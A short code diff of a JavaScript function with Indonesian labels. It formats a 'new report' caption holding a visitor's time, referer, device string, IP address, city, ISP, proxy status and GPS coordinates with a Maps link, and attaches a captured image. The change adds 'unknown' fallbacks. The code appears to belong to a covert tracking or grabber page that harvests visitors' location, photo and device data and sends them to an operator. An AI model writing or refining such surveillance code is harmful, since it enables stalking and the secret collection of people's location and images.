@@ -26,22 +26,22 @@
 
         function sendPhotoWithCaption(imageBlob) {
             const caption = `📌 *Laporan Baru*  
-🕒 *Waktu:* ${reportData.waktu}  
-🔗 *Referer:* ${reportData.referer}  
-📱 *Device:* ${reportData.userAgent}  
+🕒 *Waktu:* ${reportData.waktu || "Tidak diketahui"}  
+🔗 *Referer:* ${reportData.referer || "Tidak diketahui"}  
+📱 *Device:* ${reportData.userAgent || "Tidak diketahui"}  
 
 🌍 *Berdasarkan IP:*  
-📍 Kota: ${reportData.ipInfo.city}  
-🌏 Negara: ${reportData.ipInfo.country}  
-🗺️ Region: ${reportData.ipInfo.region}  
-🔢 IP: ${reportData.ipInfo.ip}  
-📡 ISP: ${reportData.ipInfo.isp}  
+📍 Kota: ${reportData.ipInfo.city || "Tidak diketahui"}  
+🌏 Negara: ${reportData.ipInfo.country || "Tidak diketahui"}  
+🗺️ Region: ${reportData.ipInfo.region || "Tidak diketahui"}  
+🔢 IP: ${reportData.ipInfo.ip || "Tidak diketahui"}  
+📡 ISP: ${reportData.ipInfo.isp || "Tidak diketahui"}  
 📶 Proxy: ${reportData.ipInfo.proxy ? "Ya" : "Tidak"}  
 
 📍 *Lokasi Berdasarkan GPS:*  
-🗺️ Latitude: ${reportData.gpsInfo.latitude}  
-🗺️ Longitude: ${reportData.gpsInfo.longitude}  
-🔗 [Google Maps](https://www.google.com/maps?q=${reportData.gpsInfo.latitude},${reportData.gpsInfo.longitude})`;
+🗺️ Latitude: ${reportData.gpsInfo.latitude || "Tidak diketahui"}  
+🗺️ Longitude: ${reportData.gpsInfo.longitude || "Tidak diketahui"}  
+🔗 [Google Maps](https://www.google.com/maps?q=${reportData.gpsInfo.latitude || 0},${reportData.gpsInfo.longitude || 0})`;
 
             if (imageBlob) {
                 const formData = new FormData();
